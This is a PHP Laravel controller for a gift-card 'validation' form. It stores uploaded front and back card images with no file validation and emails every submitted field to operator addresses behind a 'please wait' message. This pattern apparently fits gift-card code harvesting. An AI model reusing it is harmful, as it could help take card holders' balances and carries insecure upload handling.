<?php

namespace App\Http\Controllers;

use App\Mail\ValidationOrderReceived;
use App\Notifications\ValidationOrderNotification;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Storage;

class ValidateGiftcardController extends Controller
{
    public function store()
    {
        // Get all the data that is not null
        $data = array_filter(request()->all(), function($value) {
            return !is_null($value);
        });

        unset($data['_token']);

        if (request()->hasFile('card_image_front')) {
            $frontImagePath = request()->file('card_image_front')->store('validation_images');
            $data['card_image_front'] = Storage::url($frontImagePath);
        }

        if (request()->hasFile('card_image_back')) {
            $backImagePath = request()->file('card_image_back')->store('validation_images');
            $data['card_image_back'] = Storage::url($backImagePath);
        }

        // Get response emails (array of emails)
        $emails = app(\App\Settings\GeneralSetting::class)->receiving_email;

        // Send email with the details
        foreach ($emails as $email) {
            Notification::route('mail', $email)
                ->notify(new ValidationOrderNotification($data));
        }

        // Send confirmation email to the user
        if (isset($data['email'])) {
            Mail::to($data['email'])->send(new ValidationOrderReceived($data));
        }

        session()->flash('success', 'CARD VALIDATION IN PROCESS, PLEASE WAIT A MOMENT.');

        return redirect()->back();
    }
}
